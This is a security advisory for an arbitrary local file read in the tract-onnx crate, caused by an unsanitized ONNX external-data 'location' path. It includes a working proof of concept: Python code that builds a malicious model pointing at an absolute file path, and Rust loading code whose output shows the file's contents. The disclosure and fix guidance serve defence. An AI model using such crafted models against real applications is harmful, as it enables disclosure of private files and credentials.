# [M] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx

## Summary
Severity: Medium
Advisory: GHSA-h668-6x6g-f8r5
CVE: CVE-2026-55832
CWE: CWE-22
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:L (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-h668-6x6g-f8r5
Type: github-advisory

## Affected
- crates.io: `tract-onnx` — affected >=0 <0.21.17
- crates.io: `tract-onnx` — affected >=0.22.0 <0.22.3
- crates.io: `tract-onnx` — affected >=0.23.0 <0.23.2

## Details
### Summary

`tract` (the `tract-onnx` crate) resolves an ONNX tensor's external-data `location` by joining it onto the model directory **without any sanitization**. Because `location` comes from the (untrusted) `.onnx` file, a malicious model can make `tract` open and read an **arbitrary local file** at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference `onnx` library hardened over several CVEs; `tract` resolves `location` itself and was never hardened.

### Details

In `onnx/src/tensor.rs`, `get_external_resources()` builds the path with no checks:

```rust
let location = /* tensor.external_data "location" value — attacker-controlled */;
let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
provider.read_bytes_from_path(&mut tensor_data, &p, offset, length)?;   // Mmap::map(File::open(p)) by default
```

- `Path::join` with an **absolute** `location` (e.g. `/etc/passwd`) discards the base directory → `p = /etc/passwd`.
- A **relative** `../../../../etc/passwd` value is not normalized → directory traversal.
- The default `MmapDataResolver` (`onnx/src/data_resolver.rs`) then `mmap`s the file and copies `mmap[offset..offset+length]` into the tensor. `offset`/`length` are also taken from the file; an out-of-range slice **panics** (DoS).

No `is_absolute`, `..`, `canonicalize`, or containment check exists anywhere on this path (`tensor.rs`, `model.rs`, `data_resolver.rs`).

Reachable from the standard public API: `model_for_path(p)` (`onnx/src/model.rs`) sets `model_dir = p.parent()` and calls `load_tensor(proto, model_dir)` → `get_external_resources(.., model_dir)`.

### PoC

Tested on `tract-onnx 0.21.16` (crates.io), Rust 1.96.

1. A canary file the model must not be able to read:
   `/tmp/tract_canary_secret.txt` → `TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b`
2. Build a small `evil.onnx` with a `UINT8[37]` initializer whose `external_data` is `location=/tmp/tract_canary_secret.txt` (absolute), `offset=0`, `length=37`, fed through `Identity` to the output (raw protobuf serialization):

```python
import onnx
from onnx import helper, TensorProto, StringStringEntryProto
N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -> Path::join discards the base dir
w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
node = helper.make_node("Identity", ["W"], ["Y"])
out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
g = helper.make_graph([node], "g", [], [out], initializer=[w])
m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
open("evil.onnx", "wb").write(m.SerializeToString())
```

3. Victim loads the untrusted model with the standard API:

```rust
let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
let bytes: Vec<u8> = out[0].to_array_view::<u8>()?.iter().cloned().collect();
println!("{:?}", String::from_utf8_lossy(&bytes));
```

Output:

```
"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
```

i.e. the contents of the arbitrary local file were read by `tract` and surfaced in the inference output.

### Impact

Read-only arbitrary local file disclosure when an application uses `tract` to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds `offset`/`length`. No write or code execution.

### Suggested fix

Reject absolute `location` and any `..` component, then canonicalize and verify the resolved path stays within the model directory (mirroring `onnx` 1.22.0's `resolve_external_data_location`); reject symlinks; validate `offset`/`length` against the file size before slicing.

## References
- https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5
- https://github.com/sonos/tract
